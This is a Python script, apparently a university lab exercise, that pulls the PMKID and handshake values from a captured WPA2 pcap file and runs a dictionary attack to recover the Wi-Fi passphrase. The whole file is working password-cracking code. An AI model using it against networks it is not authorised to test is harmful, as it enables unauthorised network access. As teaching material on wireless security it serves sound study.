#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Source :  https://dalewifisec.wordpress.com/2014/05/17/the-to-ds-and-from-ds-fields/
#           https://stackoverflow.com/questions/30811426/scapy-python-get-802-11-ds-status

"""
Derive WPA keys from Passphrase and 4-way handshake info

Grâce au calcule du PMKID de chaque passPhrase et la comparaison de ce dernier avec le PMKID récupéré par wireshark,
cela nous permet de trouver la passphrase dans un dictionnaire
"""

__author__      = "Volkan Sütcü et Julien Benoit"
__copyright__   = "Copyright 2020, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "julien.benoit@heig-vd.ch et volkan.sutcu@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("PMKID_handshake.pcap") 
handshake1 = None
beaconFrame = None

# Récupértion des frames utiles, à savoir le beacon frame, ainsi que le handshake 1
# On parcourt la capture afin de trouver le premier handshake allant de l'AP à la STA
for pkt in wpa:
    if handshake1 is None and pkt.haslayer("EAPOL"):
        DS = pkt.FCfield & 0x3
        to_DS = DS & 0x1 != 0
        from_DS = DS & 0x2 != 0
        if from_DS and not to_DS:
            handshake1 = pkt
            break

# Si le handshake est trouvé, on parcours les paquets à la recherche d'un beaconFrame dont le BSSID correspond
if handshake1 is not None :
    for pkt in wpa:
        if handshake1.addr2 == pkt.addr2:
            beaconFrame = pkt
            break
    
    

# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "PMK Name" #this string is used in the pseudo-random function
ssid        = beaconFrame.info.decode()
# On remplace les ":"" par "" dans les mac adresses du client et de l'AP, afin de les transformer en bytes
APmac       = a2b_hex(str.replace(handshake1.addr2, ":", ""))
Clientmac   = a2b_hex(str.replace(handshake1.addr1, ":", ""))
# On récupère les 16 derniers bytes du handshake 1 (qui se trouve être le pmkid)
pmkid       = b2a_hex(handshake1.load[-16:])

# Authenticator and Supplicant Nonces
# En commençant depuis le key descriptor type, nous prenons les bytes n°13 à 45 qui corresponde à ANonce
ANonce      = handshake1.load[13:45]

print ("\n\nValues used to derivate keys")
print ("============================")
print ("SSID: ",ssid,"\n")
print ("AP Mac: ",b2a_hex(APmac),"\n")
print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
print ("AP Nonce: ",b2a_hex(ANonce),"\n")

passPhraseFile = "passPhraseFile.txt"
passPhraseFound = "la passPhrase n'a pas été trouvée"
ssid = str.encode(ssid)

# Permet de parcourir le fichier de passPhrases
with open(passPhraseFile) as passPhraseFile:
    for passPhrase in passPhraseFile:
        # Permet d'enlever le \n en fin de ligne s'il y en a un
        if passPhrase[-1:] == "\n":
            passPhrase = passPhrase[:-1]
        
        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        passPhrase = str.encode(passPhrase)
        pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)

        # On calcul le pmkid selon la formule indiquée dans la théorie
        pmkid_to_test = hmac.new(pmk, str.encode(A) + APmac + Clientmac, hashlib.sha1)

        # Si le pmkid calculé correspond au pmkid récupéré, alors la passPhrase a été trouvée
        if pmkid_to_test.hexdigest().encode()[:-8] == pmkid:

            print ("\nResults of the key expansion")
            print ("=============================")
            print ("PMK:\t\t",pmk.hex(),"\n")
            print ("PMKID:\t\t",pmkid.hex(),"\n")
            passPhraseFound = passPhrase.decode()
            break
        
    
    print ("\nResult of the passPhrase")
    print ("=============================")
    print("PassPhrase:\t", passPhraseFound,"\n")

